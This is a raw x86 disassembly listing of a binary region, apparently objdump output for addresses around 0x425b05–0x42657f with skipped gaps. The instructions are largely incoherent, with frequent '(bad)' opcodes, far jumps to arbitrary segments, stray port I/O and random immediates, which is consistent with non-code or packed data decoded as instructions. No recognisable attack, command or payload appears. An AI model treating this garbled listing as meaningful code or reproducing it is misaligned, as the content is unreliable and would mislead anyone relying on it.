  425b05:	or     al,BYTE PTR [ebx]
  425b07:	and    al,0x93
  425b09:	pop    ebx
  425b0a:	jmp    0x73b0e0c3
  425b0f:	lds    esp,FWORD PTR [eax]
  425b11:	pop    ebp
  425b12:	mov    WORD PTR [ecx+0x4087ea83],ds
  425b18:	xchg   ebx,eax
  425b19:	or     esp,DWORD PTR [eax-0x54]
  425b1c:	into   
  425b1d:	int    0x16
  425b1f:	xor    BYTE PTR [ebp-0x5e],dh
  425b22:	stc    
  425b23:	and    al,0x9d
  425b25:	dec    ebx
  425b26:	repnz adc ebp,DWORD PTR [edx+0x7f]
  425b2a:	and    al,0x22
  425b2c:	inc    BYTE PTR [ecx-0x80]
  425b2f:	cmp    edx,DWORD PTR [ebp+0x7d3a0a5e]
  425b35:	and    eax,0x6b1fb79e
  425b3a:	mov    edi,0x3ef6d5f8
  425b3f:	add    BYTE PTR [ebp+0x71],bl
  425b42:	repnz jmp 0x901d:0x6276eb78
  425b4a:	scas   eax,DWORD PTR es:[edi]
  425b4b:	ins    BYTE PTR es:[edi],dx
  425b4c:	inc    eax
  425b4d:	mov    bl,0x23
  425b4f:	mov    ch,0xcb
  425b51:	mov    edx,0x3c7863ea
  425b56:	(bad)  
  425b57:	fadd   DWORD PTR [ebp-0x39]
  425b5a:	mov    esi,DWORD PTR [ecx+0x3cc7cdde]
  425b60:	adc    BYTE PTR [edi],bl
  425b62:	cmp    ebp,DWORD PTR [ebx+0x11b210ad]
  425b68:	icebp  
  425b69:	popf   
  425b6a:	and    eax,0x9c8147a1
  425b6f:	and    BYTE PTR [ebp-0x3d],bh
  425b72:	bound  esi,QWORD PTR [ebx-0x31d560b3]
  425b78:	int    0xf7
  425b7a:	imul   edx,DWORD PTR [ebx+0x13e7771e],0xacabc996
  425b84:	stc    
  425b85:	xrelease mov BYTE PTR [ecx],dl
  425b88:	stos   BYTE PTR es:[edi],al
  425b89:	jle    0x425b96
  425b8b:	jge    0x425b73
  425b8d:	ret    
  425b8e:	mov    ecx,0x5fc4
	...
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	shl    BYTE PTR [edx+0x24],0xf4
  425c04:	xchg   edx,eax
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0x51000001
  425c0d:	(bad)  
  425c0e:	xchg   ebx,eax
  425c0f:	lds    ecx,FWORD PTR [edx+0x1e3bc307]
  425c15:	sbb    dx,WORD PTR ds:0xeee1cd48
  425c1c:	xor    BYTE PTR [ebp+0x2d],ch
  425c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c20:	jg     0x425c1f
  425c22:	call   DWORD PTR [esi+0x5593387f]
  425c28:	jecxz  0x425be0
  425c2a:	(bad)  
  425c2b:	lods   al,BYTE PTR ds:[esi]
  425c2c:	je     0x425be8
  425c2e:	cwde   
  425c2f:	adc    BYTE PTR [eax+0x39],dl
  425c32:	stc    
  425c33:	retf   
  425c34:	inc    esi
  425c35:	jbe    0x425bb8
  425c37:	jecxz  0x425caa
  425c39:	adc    eax,0x93f9d9c5
  425c3e:	inc    ebp
  425c3f:	xchg   esi,eax
  425c40:	cdq    
  425c41:	mov    ebp,0xa7949c23
  425c46:	stc    
  425c47:	push   cs
  425c48:	push   cs
  425c49:	pop    ss
  425c4a:	iret   
  425c4b:	sbb    BYTE PTR [ebp-0x62f34cdd],al
  425c51:	sub    DWORD PTR [edi],esp
  425c53:	jp     0x425bff
  425c55:	pop    ss
  425c56:	cmp    cl,al
  425c58:	(bad)  
  425c59:	sub    dl,BYTE PTR [esp+esi*1-0xe]
  425c5d:	sub    ah,cl
  425c5f:	xor    al,0xab
  425c61:	loopne 0x425cdf
  425c63:	stos   BYTE PTR es:[edi],al
  425c64:	popf   
  425c65:	(bad)  
  425c66:	into   
  425c67:	mov    ah,BYTE PTR [esi+0x108ddf1]
  425c6d:	or     eax,0x67f622eb
  425c72:	mov    bh,0xdc
  425c74:	cmp    esi,DWORD PTR [ecx+0x224d9ae6]
  425c7a:	sub    eax,DWORD PTR [esi-0x35842004]
  425c80:	jle    0x425c21
  425c82:	shl    DWORD PTR [edi],0xbe
  425c85:	popf   
  425c86:	add    edx,DWORD PTR [eax+ebp*1+0x1e6de671]
  425c8d:	fcmovne st,st(2)
  425c8f:	inc    ebx
  425c90:	(bad)  
  425c91:	fidiv  WORD PTR [eax+0x66]
  425c94:	ds out 0x36,eax
  425c97:	add    ch,0x40
  425c9a:	in     al,0x36
  425c9c:	gs loop 0x425c3e
  425c9f:	pop    esp
  425ca0:	loopne 0x425c69
  425ca2:	or     eax,0xf34610bc
  425ca7:	inc    esp
  425ca8:	cli    
  425ca9:	imul   edx,DWORD PTR [edi+edx*1],0x21a203b1
  425cb0:	scas   al,BYTE PTR es:[edi]
  425cb1:	rcr    BYTE PTR [ecx-0x684a8fab],0x6c
  425cb8:	inc    eax
  425cb9:	enter  0xa310,0x48
  425cbd:	jmp    0xea2:0xa5be752c
  425cc4:	das    
  425cc5:	and    eax,0xcaa7f680
  425cca:	ror    DWORD PTR [eax-0x6],0x60
  425cce:	daa    
  425ccf:	pop    ds
  425cd0:	or     edi,eax
  425cd2:	aas    
  425cd3:	jbe    0x425d37
  425cd5:	mov    esp,0x49e27d34
  425cda:	push   esi
  425cdb:	xlat   BYTE PTR fs:[ebx]
  425cdd:	nop
  425cde:	inc    esp
  425cdf:	aaa    
  425ce0:	mov    dh,0xee
  425ce2:	jno    0x425d55
  425ce4:	mov    al,0xbe
  425ce6:	push   esi
  425ce7:	inc    ebp
  425ce8:	xchg   esi,eax
  425ce9:	int3   
  425cea:	push   ebp
  425ceb:	inc    ebp
  425cec:	mov    ecx,0x36d9222e
  425cf1:	mov    ds:0x5fe8ce32,al
  425cf6:	xlat   BYTE PTR ds:[ebx]
  425cf7:	sbb    BYTE PTR [eax-0x48249ee4],cl
  425cfd:	mov    dh,0x1f
  425cff:	and    DWORD PTR [bp+di-0x9],ecx
  425d03:	out    dx,al
  425d04:	jno    0x425d1e
  425d06:	(bad)  
  425d07:	pop    ds
  425d08:	call   0xfa97396
  425d0d:	shr    DWORD PTR [ebp-0x2c],cl
  425d10:	popf   
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xfcd1e9b1,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0x65000001
  425d8d:	dec    edx
  425d8e:	arpl   ax,cx
  425d90:	add    bh,BYTE PTR [ebx+ecx*2-0x14]
  425d94:	sti    
  425d95:	mov    ch,0xe5
  425d97:	sbb    DWORD PTR ds:0x89007b59,0x60
  425d9e:	rcl    BYTE PTR [edi+edx*4],cl
  425da1:	jmp    0x425dbb
  425da3:	cmp    cl,BYTE PTR [esi+0x54d431c7]
  425da9:	mov    bl,0x7e
  425dab:	sbb    DWORD PTR [eax-0x36d422e3],eax
  425db1:	imul   edi,edi,0x7b7ad423
  425db7:	and    dh,BYTE PTR [edi+0x74]
  425dba:	lods   al,BYTE PTR ds:[esi]
  425dbb:	adc    bl,dh
  425dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dbe:	jg     0x425e16
  425dc0:	(bad)  
  425dc1:	cdq    
  425dc2:	add    BYTE PTR [ecx-0x599ac6cd],0xde
  425dc9:	push   cs
  425dca:	dec    ebp
  425dcb:	dec    ecx
  425dcc:	mov    ebp,0xbebcd272
  425dd1:	fstp   TBYTE PTR [edi]
  425dd3:	mov    ?,esp
  425dd5:	cmc    
  425dd6:	sub    BYTE PTR [esi-0x5de093d1],0x32
  425ddd:	ret    
  425dde:	rcr    DWORD PTR [esi-0x79],1
  425de1:	fimul  WORD PTR [esi-0x65]
  425de4:	fwait
  425de5:	xchg   edi,eax
  425de6:	sbb    eax,0x4abbae50
  425deb:	imul   dh
  425ded:	shl    BYTE PTR [ecx-0x71],cl
  425df0:	sub    DWORD PTR [ebx+0x6e],esi
  425df3:	and    eax,0x196df8d0
  425df8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425df9:	jg     0x425e3b
  425dfb:	sub    al,0x8e
  425dfd:	in     eax,dx
  425dfe:	rol    DWORD PTR [edx+0x4746c755],1
  425e04:	add    dl,al
  425e06:	jg     0x425d96
  425e08:	test   eax,0x9872fc87
  425e0d:	adc    edi,DWORD PTR [ecx-0x41]
  425e10:	xor    BYTE PTR [edx],ah
  425e12:	mov    ebx,edi
  425e14:	ins    BYTE PTR es:[edi],dx
  425e15:	into   
  425e16:	not    DWORD PTR [ebx-0xceb3c09]
  425e1c:	pop    esi
  425e1d:	sbb    esi,DWORD PTR [eax+ebp*4+0x2f5e15c7]
  425e24:	mov    esi,0xdb1a3300
  425e29:	fild   WORD PTR [ebx-0x5ef8035c]
  425e2f:	dec    eax
  425e30:	xchg   esp,eax
  425e31:	repnz sbb ecx,DWORD PTR [edi]
  425e34:	pop    ebp
  425e35:	aad    0xdc
  425e37:	stc    
  425e38:	adc    DWORD PTR [ecx-0x30188359],esp
  425e3e:	out    dx,al
  425e3f:	pop    esp
  425e40:	shl    BYTE PTR [edi-0x1c4a0c60],cl
  425e46:	xor    BYTE PTR [esi],0xb5
  425e49:	inc    esi
  425e4a:	mov    ds:0x1f4f7deb,eax
  425e4f:	mov    ah,0xfe
  425e51:	inc    edx
  425e52:	adc    eax,DWORD PTR [ebx]
  425e54:	jbe    0x425ea7
  425e56:	sbb    ebx,DWORD PTR [esi-0x22]
  425e59:	jne    0x425e4e
  425e5b:	xchg   esp,eax
  425e5c:	pop    eax
  425e5d:	(bad)  
  425e5e:	(bad)  
  425e5f:	in     al,dx
  425e60:	and    BYTE PTR [eax-0x758b2c1b],bl
  425e66:	adc    eax,0xefc9413
  425e6b:	ins    BYTE PTR es:[edi],dx
  425e6c:	mov    edi,0x645b943e
  425e71:	loopne 0x425e48
  425e73:	xor    ebp,esi
  425e75:	add    bh,dh
  425e77:	fstp   QWORD PTR [edi]
  425e79:	or     eax,0xffffff82
  425e7c:	pop    edx
  425e7d:	scas   al,BYTE PTR es:[edi]
  425e7e:	xchg   edi,eax
  425e7f:	mov    DWORD PTR [ecx+0x648505eb],esi
  425e85:	xlat   BYTE PTR ds:[ebx]
  425e86:	mov    ebp,0x507ef527
  425e8b:	sti    
  425e8c:	jne    0x425e7f
  425e8e:	fwait
  425e8f:	xchg   edi,eax
  425e90:	add    eax,0x0
	...
  425ef1:	add    BYTE PTR [eax],al
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	out    0xe4,eax
  425f02:	mov    WORD PTR [eax+0x1959c],es
  425f08:	add    eax,0x18000001
  425f0d:	mov    esi,0x7fef637
  425f12:	push   ecx
  425f13:	xchg   BYTE PTR [edx-0x5f],al
  425f16:	shr    DWORD PTR [edi+eiz*4-0x2551a715],0xf0
  425f1e:	(bad)  [eax+0x49afe019]
  425f24:	lods   eax,DWORD PTR ds:[esi]
  425f25:	outs   dx,DWORD PTR ds:[esi]
  425f26:	out    dx,eax
  425f27:	mov    DWORD PTR [edx-0x543344f0],edx
  425f2d:	cmc    
  425f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f2f:	sub    ebx,DWORD PTR [ebx]
  425f31:	in     eax,0x1e
  425f33:	lods   eax,DWORD PTR ds:[esi]
  425f34:	loope  0x425f45
  425f36:	add    esi,DWORD PTR [edi-0x29020c93]
  425f3c:	je     0x425f1b
  425f3e:	inc    edi
  425f3f:	inc    edx
  425f40:	ins    DWORD PTR es:[edi],dx
  425f41:	or     al,0xa1
  425f43:	lahf   
  425f44:	pop    ds
  425f45:	pop    esp
  425f46:	jle    0x425fb7
  425f48:	loopne 0x425f23
  425f4a:	sub    eax,0x42a9e9fd
  425f4f:	xor    BYTE PTR [ebx+0x21],dl
  425f52:	and    al,0x5b
  425f54:	loop   0x425fb1
  425f56:	cmp    DWORD PTR [ebx-0x6d],edi
  425f59:	int    0x90
  425f5b:	cdq    
  425f5c:	mov    edi,0xae742729
  425f61:	and    ebp,DWORD PTR [ebp-0x65259c44]
  425f67:	jns    0x425ef4
  425f69:	out    0x81,eax
  425f6b:	cli    
  425f6c:	xor    bh,bl
  425f6e:	daa    
  425f6f:	test   al,0x3e
  425f71:	mov    ebx,0x4830e85c
  425f76:	xchg   ebx,eax
  425f77:	repnz or al,0x3d
  425f7a:	mov    eax,ds:0x5bb82901
  425f7f:	cmp    BYTE PTR ds:0x73a3475f,al
  425f85:	out    dx,eax
  425f86:	mov    edi,0x19c0eb2b
  425f8b:	xor    DWORD PTR [eax-0x53316cca],ecx
  425f91:	and    al,0x2b
  425f93:	dec    ebx
  425f94:	aaa    
  425f95:	mov    esi,0x8cb88427
  425f9a:	(bad)  
  425f9b:	fsub   QWORD PTR [ebx-0x2a]
  425f9e:	pusha  
  425f9f:	lds    edi,FWORD PTR [eax-0x64dbce59]
  425fa5:	ins    BYTE PTR es:[edi],dx
  425fa6:	lea    edx,[ecx-0x3f520738]
  425fac:	aad    0xd3
  425fae:	(bad)  
  425faf:	fcomp  QWORD PTR [eax+0x55]
  425fb2:	mov    ds:0x4e654f0b,al
  425fb7:	nop
  425fb8:	pop    esp
  425fb9:	inc    ebp
  425fba:	and    al,0x7f
  425fbc:	cmp    bh,0xcd
  425fbf:	test   eax,0x2a03924e
  425fc4:	mov    dl,0x59
  425fc6:	arpl   WORD PTR [ebx-0x59],di
  425fc9:	cmp    DWORD PTR [esi+0x16],esi
  425fcc:	iret   
  425fcd:	pop    edx
  425fcf:	aaa    
  425fd0:	ins    BYTE PTR es:[edi],dx
  425fd1:	(bad)  
  425fd2:	stos   BYTE PTR es:[edi],al
  425fd3:	pop    edx
  425fd4:	inc    ebp
  425fd5:	push   edx
  425fd6:	enter  0x5524,0x48
  425fda:	add    ebx,ebp
  425fdc:	je     0x425fbd
  425fde:	sub    BYTE PTR [ecx+eiz*4],0x8a
  425fe2:	sti    
  425fe3:	cmp    ebx,DWORD PTR [ecx-0x2a20bd9]
  425fe9:	fmul   QWORD PTR [edx+0x7be23c67]
  425fef:	inc    esp
  425ff0:	add    DWORD PTR [edi-0x34],edi
  425ff3:	stc    
  425ff4:	sub    DWORD PTR [ebx],ebx
  425ff6:	loop   0x425fc1
  425ff8:	mov    al,ds:0x5f995acd
  425ffd:	int    0x3e
  425fff:	cmp    ch,0x38
  426002:	into   
  426003:	push   eax
  426004:	mov    esi,0x618560c1
  426009:	fisubr WORD PTR [eax+0x7a8e0ab9]
  42600f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426010:	mov    WORD PTR [eax],es
	...
  426072:	add    BYTE PTR [eax],al
  426074:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	sbb    ebp,eax
  426082:	popa   
  426083:	jmp    0x43f729
  426088:	add    eax,0x66000001
  42608d:	mov    edi,0x21565d16
  426092:	jae    0x426014
  426094:	shrd   DWORD PTR [ebx+0x5df6ff0b],edi,0x74
  42609c:	push   cs
  42609d:	add    BYTE PTR [ebp+0x31],bl
  4260a0:	stc    
  4260a1:	in     al,dx
  4260a2:	das    
  4260a3:	outs   dx,DWORD PTR ds:[esi]
  4260a4:	dec    eax
  4260a5:	pusha  
  4260a6:	adc    bl,bh
  4260a8:	jmp    0x29b25f14
  4260ad:	(bad)  
  4260ae:	mov    ebx,0x6887c43e
  4260b3:	xchg   edx,eax
  4260b4:	adc    DWORD PTR [ebp-0x3f8b1d6e],ebx
  4260ba:	sub    ah,BYTE PTR [edi]
  4260bc:	inc    DWORD PTR ds:0x5b822cd6
  4260c2:	pusha  
  4260c3:	cmp    DWORD PTR [eax],edi
  4260c5:	inc    esi
  4260c6:	pop    eax
  4260c7:	ja     0x426077
  4260c9:	pop    es
  4260ca:	inc    edx
  4260cb:	xchg   edi,eax
  4260cc:	or     edx,0x59
  4260cf:	and    BYTE PTR [edx+0x757f9ce6],bl
  4260d5:	call   0x46e2:0x33c5c19d
  4260dc:	in     eax,dx
  4260dd:	pop    esp
  4260de:	and    BYTE PTR [eax-0x11277b4d],ch
  4260e4:	adc    DWORD PTR [eax-0x35],ebp
  4260e7:	jmp    0xcc2591c8
  4260ec:	add    dl,BYTE PTR [ebx-0x67390ac7]
  4260f2:	cwde   
  4260f3:	in     eax,0x86
  4260f5:	mov    al,BYTE PTR [ebp+0x6d]
  4260f8:	cld    
  4260f9:	mov    ds:0x1e503f7c,al
  4260fe:	sbb    DWORD PTR ss:[ebp-0x36d32a2],edx
  426105:	ss pop esp
  426107:	jle    0x4260d2
  426109:	mov    ebp,0x49a36c72
  42610e:	adc    eax,0x588ea20d
  426113:	fdiv   QWORD PTR fs:[edx+ecx*4-0x72]
  426118:	nop
  426119:	jmp    0x86623f02
  42611e:	and    eax,0xdad4a448
  426123:	retf   0x9cfa
  426126:	fwait
  426127:	cdq    
  426128:	jp     0x42616f
  42612a:	shl    DWORD PTR [ecx+0x563ac585],cl
  426130:	mov    al,0xb5
  426132:	int3   
  426133:	cmp    ebp,edx
  426135:	sbb    al,bl
  426137:	xchg   DWORD PTR [eax-0x4bad2a28],ebp
  42613d:	lahf   
  42613e:	inc    ebp
  42613f:	clc    
  426140:	pushf  
  426141:	sub    ecx,edx
  426143:	jnp    0x4260e9
  426145:	mov    cl,0x8e
  426147:	mov    DWORD PTR [eax],eax
  426149:	sti    
  42614a:	(bad)  
  42614b:	fidiv  WORD PTR [esi+0x524f6494]
  426151:	(bad)  
  426152:	cli    
  426153:	cmp    BYTE PTR [esi+0x53],ch
  426156:	retf   
  426157:	rcl    BYTE PTR [esi+0x126e432a],cl
  42615d:	scas   eax,DWORD PTR es:[edi]
  42615e:	xor    BYTE PTR [edx],bl
  426160:	mov    dl,0x85
  426162:	outs   dx,DWORD PTR ds:[esi]
  426163:	out    dx,eax
  426164:	call   0x2bacf03d
  426169:	popf   
  42616a:	xchg   ebp,eax
  42616b:	or     al,0xdb
  42616d:	and    BYTE PTR ds:0x21493bfe,dh
  426173:	and    DWORD PTR [esi+ebp*1],0xffffffd4
  426177:	and    eax,eax
  426179:	mov    esi,0x289b6b3f
  42617e:	xor    edx,eax
  426180:	xchg   ebp,eax
  426181:	xchg   esi,eax
  426182:	push   esi
  426183:	sbb    eax,0x6601aab9
  426188:	test   ah,dh
  42618a:	fwait
  42618b:	inc    eax
  42618c:	(bad)  
  42618d:	retf   
  42618e:	fdivr  QWORD PTR [ecx+ebx*1]
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	inc    esp
  426201:	add    al,0xa1
  426203:	xchg   BYTE PTR [esi+0x5000197],ah
  426209:	add    DWORD PTR [eax],eax
  42620b:	add    BYTE PTR [esi+esi*1+0x22],ah
  42620f:	loop   0x426225
  426211:	test   BYTE PTR [ebx+0x2c],bl
  426214:	ret    
  426215:	xlat   BYTE PTR ds:[ebx]
  426216:	pusha  
  426217:	jb     0x42626a
  426219:	mov    ah,0x6
  42621b:	jnp    0x426204
  42621d:	jno    0x4261f3
  42621f:	push   ss
  426220:	cs das 
  426222:	aam    0xfb
  426224:	test   eax,0xc65f1ce2
  426229:	pop    ecx
  42622a:	(bad)  
  42622b:	test   BYTE PTR [eax-0x32],0xfe
  42622f:	les    edi,FWORD PTR [esi]
  426231:	lods   al,BYTE PTR ds:[esi]
  426232:	fiadd  WORD PTR [edx-0x6b5c0325]
  426238:	ins    BYTE PTR es:[edi],dx
  426239:	ret    
  42623a:	add    bh,BYTE PTR [ecx+eax*2]
  42623d:	sub    ah,BYTE PTR ds:0x2725b510
  426243:	call   0xc2576042
  426248:	jnp    0x4261e0
  42624a:	xor    al,0x12
  42624c:	pop    ebp
  42624d:	sbb    DWORD PTR [esi+esi*1-0x7f],edi
  426251:	les    eax,FWORD PTR [edx]
  426253:	or     eax,eax
  426255:	jmp    0x4262af
  426257:	pushf  
  426258:	cld    
  426259:	pmovmskb edx,mm6
  42625c:	pop    eax
  42625d:	cs xchg ebx,eax
  42625f:	int    0x2b
  426261:	sti    
  426262:	int3   
  426263:	into   
  426264:	les    edi,FWORD PTR [ecx-0x6b149368]
  42626a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42626b:	inc    edx
  42626c:	push   cs
  42626d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42626e:	call   0xd186afce
  426273:	xlat   BYTE PTR cs:[ebx]
  426275:	fdivr  DWORD PTR [ecx]
  426277:	mov    esp,0x63e4d97e
  42627c:	mov    ebp,DWORD PTR [edx]
  42627e:	push   eax
  42627f:	aad    0xa4
  426281:	add    ebp,DWORD PTR [esi]
  426283:	mov    edi,0x6d997c07
  426288:	add    eax,DWORD PTR ds:0xf026bf1b
  42628e:	js     0x4262fe
  426290:	mov    edx,0xc99bd347
  426295:	xlat   BYTE PTR ds:[ebx]
  426296:	std    
  426297:	xor    DWORD PTR [ebp+0x7e2ed287],0xfffffff2
  42629e:	leave  
  42629f:	push   edi
  4262a0:	mov    edx,0xb9e8f6bd
  4262a5:	mov    ch,0xed
  4262a7:	addr16 test eax,0x6b5973f8
  4262ad:	fidiv  DWORD PTR [edi]
  4262af:	push   esp
  4262b0:	pop    esi
  4262b1:	sbb    DWORD PTR [edx-0x37de537f],edx
  4262b7:	sub    al,0x46
  4262b9:	lods   eax,DWORD PTR ds:[esi]
  4262ba:	sub    eax,0x44f47a00
  4262bf:	addr16 js 0x4262c7
  4262c2:	inc    edi
  4262c3:	or     ch,BYTE PTR [edx]
  4262c5:	sub    al,0xe9
  4262c7:	sbb    dl,bh
  4262c9:	cld    
  4262ca:	jno    0x4262da
  4262cc:	sub    eax,0x65a591c2
  4262d1:	sub    ebp,edi
  4262d3:	dec    esi
  4262d4:	sbb    al,0xd0
  4262d6:	dec    ebx
  4262d7:	adc    BYTE PTR ds:0x444f1532,ch
  4262dd:	pop    ebx
  4262de:	rcl    DWORD PTR [ebx+ecx*1],1
  4262e1:	jmp    0x4262b6
  4262e3:	stos   DWORD PTR es:[edi],eax
  4262e4:	add    BYTE PTR [ecx],0x43
  4262e7:	jl     0x426309
  4262e9:	out    0x65,al
  4262eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262ec:	or     BYTE PTR [edi],0x9e
  4262ef:	out    0x46,eax
  4262f1:	test   ebp,0x7079ad43
  4262f7:	ds xchg edx,eax
  4262f9:	sbb    bh,BYTE PTR [edx+0x48]
  4262fc:	pop    esi
  4262fd:	les    eax,FWORD PTR [esi-0x61b4396b]
  426303:	xchg   esp,eax
  426304:	cld    
  426305:	or     esp,ecx
  426307:	cwde   
  426308:	cld    
  426309:	mov    ebx,0xba7ba44a
  42630e:	sbb    eax,0xf6fc
	...
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x8411695b
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0x83000001
  42638d:	data16 cmp dh,BYTE PTR [ecx+0xf]
  426391:	enter  0x86e3,0x34
  426395:	push   0xbd8a0e93
  42639a:	jmp    0x8daa:0xe9996487
  4263a1:	pop    edi
  4263a2:	sbb    bl,al
  4263a4:	cwde   
  4263a5:	mov    esp,0xee3dc2b0
  4263aa:	add    bh,BYTE PTR [edx+0x5aea901b]
  4263b0:	mov    esi,edi
  4263b2:	mov    dh,0xb3
  4263b4:	stos   DWORD PTR es:[edi],eax
  4263b5:	dec    esi
  4263b6:	iret   
  4263b7:	push   esi
  4263b8:	test   BYTE PTR [ebx+0x5d],bl
  4263bb:	xor    BYTE PTR ds:0xa2a928a9,0x79
  4263c2:	imul   ebp,DWORD PTR ds:0x8887329,0x68d40cb2
  4263cc:	add    eax,0x29bd456f
  4263d1:	popf   
  4263d2:	mov    ds:0xd31ffc6f,al
  4263d7:	mov    eax,0xb70d4d09
  4263dc:	es xor cl,0x37
  4263e0:	sub    DWORD PTR [eax],esp
  4263e2:	cmp    al,0xcd
  4263e4:	pop    edx
  4263e5:	fild   QWORD PTR [edi]
  4263e7:	or     eax,0x217d44bc
  4263ec:	(bad)  [ebx+0x66232fc5]
  4263f2:	scas   al,BYTE PTR es:[edi]
  4263f3:	test   DWORD PTR [ecx],ecx
  4263f5:	scas   al,BYTE PTR es:[edi]
  4263f6:	es adc cl,ah
  4263f9:	sbb    al,0xe7
  4263fb:	cmp    al,0xa0
  4263fd:	cmp    DWORD PTR fs:[ebp+0x60],0x19
  426402:	push   esi
  426403:	mov    ds:0x9385d787,al
  426408:	push   eax
  426409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42640a:	ds dec ebp
  42640c:	xchg   edx,eax
  42640d:	lock (bad) 
  42640f:	clc    
  426410:	add    esp,DWORD PTR [eax+0x58]
  426413:	fwait
  426414:	das    
  426415:	and    eax,0xae8287a1
  42641a:	jo     0x4263c0
  42641c:	out    dx,al
  42641d:	and    ah,cl
  42641f:	mov    edx,0x936b6e2a
  426424:	es scas al,BYTE PTR es:[edi]
  426426:	dec    BYTE PTR [eax+0x24]
  426429:	sti    
  42642a:	stc    
  42642b:	or     BYTE PTR [ecx-0x7b],0xcc
  42642f:	jne    0x426483
  426431:	push   esi
  426433:	fsubr  QWORD PTR [esi-0x45]
  426436:	push   cs
  426437:	xchg   edi,eax
  426438:	sbb    DWORD PTR [edi+0x147c81a2],esi
  42643e:	clc    
  42643f:	pushw  ds
  426441:	(bad)  
  426442:	pop    edx
  426443:	in     al,0x89
  426445:	sub    ch,al
  426447:	inc    ebp
  426448:	bound  esp,QWORD PTR [edi-0x48263783]
  42644e:	pop    ebp
  42644f:	scas   eax,DWORD PTR es:[edi]
  426450:	pop    ss
  426451:	dec    esp
  426452:	jmp    0x347c:0x945504ae
  426459:	cli    
  42645a:	ror    DWORD PTR [ebp-0x2e],1
  42645d:	jnp    0x42641a
  42645f:	mov    ecx,0x8a666162
  426464:	dec    ebx
  426465:	daa    
  426466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426467:	dec    edx
  426468:	mov    DWORD PTR [edx-0x6dbc7ce5],eax
  42646e:	inc    esi
  42646f:	aas    
  426470:	pop    ebp
  426471:	dec    eax
  426472:	xchg   esp,eax
  426473:	xchg   DWORD PTR [ecx-0x53],ebx
  426476:	neg    ecx
  426478:	inc    esp
  426479:	mov    ebp,0x59888d2d
  42647e:	push   eax
  42647f:	call   0x2a2dd655
  426484:	test   cl,ch
  426486:	jge    0x426481
  426488:	jnp    0x4264ea
  42648a:	sbb    BYTE PTR [ebx],al
  42648c:	jp     0x426440
  42648e:	mov    ebp,0x5336
	...
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [edx-0x4f0fd69a],esp
  426505:	cdq    
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0x4f000001
  42650d:	push   es
  42650e:	daa    
  42650f:	aam    0x8a
  426511:	or     al,0x99
  426513:	fwait
  426514:	mov    eax,ds:0x9704be84
  426519:	xchg   edx,eax
  42651a:	and    esp,DWORD PTR [edx]
  42651c:	sbb    dl,dh
  42651e:	xor    eax,0xf528a10e
  426523:	mov    ss,WORD PTR [ecx+0x1a7015f4]
  426529:	inc    edx
  42652a:	adc    al,0x6e
  42652c:	outs   dx,DWORD PTR ds:[esi]
  42652d:	cmp    cl,bl
  42652f:	clc    
  426530:	(bad)  
  426531:	popa   
  426532:	clc    
  426533:	scas   eax,DWORD PTR es:[edi]
  426534:	pop    esp
  426535:	fld    DWORD PTR [esi+0x2a3bfe48]
  42653b:	and    ebp,DWORD PTR [ecx-0x42]
  42653e:	pop    edx
  42653f:	iret   
  426540:	sbb    DWORD PTR [edi],ebx
  426542:	lock hlt 
  426544:	sub    BYTE PTR [ebx+0x5269335e],bl
  42654a:	add    edx,esi
  42654c:	ja     0x4264ed
  42654e:	in     al,0x60
  426550:	cmp    BYTE PTR [ecx],ah
  426552:	test   DWORD PTR [edx],esi
  426554:	xchg   ecx,eax
  426555:	jae    0x4265c1
  426557:	add    DWORD PTR [eax-0x7],eax
  42655a:	pop    esi
  42655b:	sar    DWORD PTR [edx-0xc55fe08],1
  426561:	test   al,0x1e
  426563:	je     0x42653f
  426565:	mov    ebx,DWORD PTR [ecx-0x7adf0405]
  42656b:	push   0xe330b76a
  426570:	je     0x4265b0
  426572:	sbb    DWORD PTR [esi+0xc4f15cc],esi
  426578:	adc    al,ch
  42657a:	jg     0x426549
  42657c:	jb     0x42655f
  42657e:	dec    ebx
  42657f:	lods   eax,DWORD PTR ds:[esi]
